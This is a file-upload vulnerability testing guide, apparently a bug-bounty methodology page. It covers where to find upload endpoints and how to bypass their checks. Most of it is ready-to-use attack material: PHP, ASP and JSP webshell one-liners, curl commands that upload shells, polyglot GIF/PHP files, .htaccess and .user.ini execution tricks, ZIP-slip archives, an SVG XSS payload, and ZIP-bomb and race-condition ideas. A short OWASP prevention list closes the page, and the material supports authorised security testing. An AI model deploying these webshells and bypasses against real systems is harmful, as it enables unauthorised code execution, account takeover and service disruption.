# File Upload

> Comprehensive methodology and one‑liner commands for testing insecure file upload vulnerabilities, incorporating 2025–2026 trends (filename truncation, metadata exploits, UI‑only restrictions, ZIP bombs, parser discrepancies) and authoritative references (OWASP File Upload Cheat Sheet, PortSwigger Web Security Academy, PayloadsAllTheThings, Intigriti advanced guides).

File upload features are high‑risk: weak validation allows malicious files (webshells, XSS payloads, malware) to be stored and executed, often leading to Remote Code Execution (RCE), account takeover, or data theft.

## Methodology

### Targets & Functionality to Hunt

Focus on any endpoint allowing user‑controlled file uploads:

- Profile pictures / avatars
- Attachments (comments, tickets, messages)
- Document / resume / CV uploads
- Image galleries / editors
- File sharing / import features
- Backup / restore (if user‑supplied)
- Report generators with custom templates
- API multipart uploads (`/upload`, `/files`, `/media`)

**Common parameters / fields:**  
`file`, `upload`, `avatar`, `image`, `document`, `attachment`, `filename`, `Content‑Type` (multipart)

### Basic Checks & Exploitation Steps

1. Upload a benign file (e.g., `test.jpg`) → note filename, path, MIME, response
2. Check direct access: Is the file served from predictable URL? (`/uploads/test.jpg`)
3. Test for execution: Upload webshell variants and access URL

**Webshell PoCs (start simple):**
- PHP: `<?php system($_GET['cmd']); ?>` as `.php`
- ASP: `<% Response.Write("test") %>` as `.asp`
- JSP: `<% Runtime.getRuntime().exec(request.getParameter("cmd")) %>`

## Tool Installation & Setup

### Upload Bypass Tools

```bash
# sAjibuu/Upload_Bypass
git clone https://github.com/sAjibuu/Upload_Bypass.git
cd Upload_Bypass
pip3 install -r requirements.txt
```

### ffuf (fuzzing extensions)

```bash
go install github.com/ffuf/ffuf/v2@latest
```

### Burp Suite Extensions

- **Upload Scanner** (BApp Store)
- **Burp Intruder** for filename/MIME fuzzing

### SecLists Wordlists

```bash
# File upload bypass wordlists
curl -sL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/file-upload-bypass.txt -o /home/pwn/wordlists/file-upload-bypass.txt
```

## Testing Commands (One‑Liners)

### 1. Find Upload Endpoints

```bash
# Search crawled URLs for upload‑related keywords
cat crawledurls.txt | grep -iE "(upload|file|avatar|profile|image|attachment)"
```

### 2. Basic Upload Testing

```bash
# Test PHP upload
curl -X POST "http://target.com/upload" -F "file=@shell.php"
# Test multiple extensions
for ext in php php5 phtml phar php7; do 
    curl -X POST "http://target.com/upload" -F "file=@shell.$ext" 2>/dev/null | grep -q "success" && echo "$ext: OK"; 
done
```

### 3. Extension Bypass Payloads

| Extension | Risk | Example |
|-----------|------|---------|
| `.php` | Execute code | `shell.php` |
| `.php5` | Execute code | `shell.php5` |
| `.phtml` | Execute code | `shell.phtml` |
| `.jpg.php` | Double extension bypass | `shell.jpg.php` |
| `.php%00.jpg` | Null byte injection | `shell.php%00.jpg` |
| `.php.` | Trailing dot | `shell.php.` |
| `.php%20` | URL‑encoded space | `shell.php%20` |
| `.php#` | Fragment truncation | `shell.php#.jpg` |
| `.php;.jpg` | Semicolon separator | `shell.php;.jpg` |
| `.PhP` | Case variation | `shell.PhP` |
| `.pHP5` | Mixed case | `shell.pHP5` |

### 4. Content‑Type Bypass

```bash
# Spoof MIME type as image/gif
curl -X POST "http://target.com/upload" -F "file=@shell.php" -H "Content-Type: image/gif"
```

### 5. Magic Bytes Bypass

```bash
# Create polyglot GIF + PHP
echo "GIF89a<?php system(\$_GET['cmd']);?>" > shell.gif.php
# Upload polyglot
curl -X POST "http://target.com/upload" -F "file=@shell.gif.php"
```

### 6. SVG Upload (XSS)

```bash
# Create malicious SVG
cat > evil.svg << 'EOF'
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
</svg>
EOF
# Upload SVG
curl -X POST "http://target.com/upload" -F "file=@evil.svg"
```

### 7. .htaccess Upload (PHP execution for images)

```bash
# Create .htaccess to treat .jpg as PHP
cat > .htaccess << 'EOF'
AddType application/x-httpd-php .jpg
EOF
curl -X POST "http://target.com/upload" -F "file=@.htaccess"
# Then upload a .jpg containing PHP code
```

### 8. .user.ini Upload (auto_prepend_file)

```bash
# Create .user.ini
cat > .user.ini << 'EOF'
auto_prepend_file=shell.jpg
EOF
curl -X POST "http://target.com/upload" -F "file=@.user.ini"
```

### 9. ZIP Slip (Archive Traversal)

```bash
# Create malicious ZIP with path traversal
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
zip -r malicious.zip ../../../shell.php
# Upload ZIP and hope server extracts it
curl -X POST "http://target.com/upload" -F "file=@malicious.zip"
```

### 10. Fuzzing Extensions with ffuf

```bash
# Fuzz extension parameter
ffuf -u "http://target.com/upload" -X POST -H "Content-Type: multipart/form-data" -F "file=@shell.FUZZ" -w /home/pwn/wordlists/file-upload-bypass.txt -mc 200
```

## Advanced Techniques & Bypasses (2025–2026 Trends)

### UI‑Only Restrictions Bypass

- Upload restrictions enforced only in frontend (JavaScript) → bypass via direct API call with `curl` or Burp Repeater
- Example: Budibase CVE‑2026‑25737 style bypass

### Filename Truncation / Parser Diffs

- Use `#`, `;`, `%00`, long filenames exceeding server‑side truncation limit
- Different parsing between frontend proxy, web server, and application logic

### Metadata Exploits

- SVG with `<script>alert(1)</script>` → stored XSS when rendered as image
- Polyglot files (valid PDF + PHP) that pass MIME checks but execute as PHP
- EXIF metadata injection (e.g., `<?php system($_GET['cmd']); ?>` in JPEG comments)

### Parser / Library Bugs

- **ImageMagick (ImageTragick)** – upload SVG with `https://` payload leading to SSRF/RCE
- **FFmpeg command injection** – upload video with malicious metadata triggering command execution during processing
- **XML parsers** – XXE via uploaded SVG, DOCX, PDF, etc.

### ZIP Bomb / DoS

- Create a tiny ZIP that expands to gigabytes (e.g., 42.zip technique) to exhaust server disk space

### Race Conditions / Multiple Uploads

- Upload a benign file, then rapidly upload a malicious file with same name to overwrite before validation
- Use parallel requests (`xargs -P`) to exploit time‑of‑check‑time‑of‑use (TOCTOU)

### Second‑Order Execution

- Upload a file that is later included/processed (e.g., template upload, report generation)
- Example: Upload `.html` with XSS that is rendered in admin panel

### Server‑Side Processing Vulnerabilities

- Image resizing libraries (e.g., GraphicsMagick, PIL) may have command injection or file read vulnerabilities
- Document converters (e.g., LibreOffice, Pandoc) may execute arbitrary code

## Detection & Verification

**Indicators of Vulnerability:**

- File uploaded successfully despite forbidden extension
- Direct URL access → code execution (webshell response)
- Stored XSS via image preview / metadata
- Server error / unusual response on malicious file
- Out‑of‑band (OOB) callback or timing delay if blind

**Impact PoC:**

- RCE: `?cmd=id` → `uid=33(www‑data)`
- XSS: Alert in profile view
- DoS: ZIP bomb upload causing resource exhaustion

**Verification Steps:**

1. Upload a benign file to understand the upload flow and resulting URL pattern
2. Attempt to upload a webshell with common bypass techniques
3. Access the uploaded file via its direct URL and test for code execution
4. If XSS, verify the payload triggers in relevant context (profile, gallery, etc.)
5. For blind scenarios, use OOB techniques (DNS, HTTP callbacks) or time‑based delays

## Prevention Guidance (OWASP Latest)

1. **Allow‑list extensions & MIME types** – validate server‑side, reject everything else
2. **Validate content** – check magic bytes (libmagic), scan for malware (ClamAV, MetaDefender)
3. **Rename files** – use random UUID + safe extension; avoid user‑controlled filenames
4. **Store outside web root** – serve via a secure script that enforces authentication and proper headers
5. **Set proper permissions** – no execute bit on uploaded files; use `chmod 644`
6. **Size limits** – restrict both individual file size and total upload volume
7. **Disable dangerous functions** – in PHP, disable `system()`, `exec()`, `shell_exec()`, etc. via `php.ini`
8. **Run parsers in sandbox** – isolate image/video/document processing in containers or serverless functions
9. **Use secure libraries** – keep ImageMagick, FFmpeg, LibreOffice up‑to‑date; apply security patches
10. **Implement logging & monitoring** – track upload events, scan for suspicious patterns, alert on anomalies

## References

- **OWASP File Upload Cheat Sheet** – [OWASP Documentation](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- **PortSwigger File Upload Vulnerabilities** – [PortSwigger Web Security Academy](https://portswigger.net/web‑security/file‑upload)
- **PayloadsAllTheThings – File Upload** – [GitHub Repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- **Intigriti Advanced Guide (2024–2025)** – recent bypass techniques and CVEs
- **Recent CVEs (2025–2026)** – Budibase CVE‑2026‑25737, UI‑only restriction bypasses, parser discrepancies
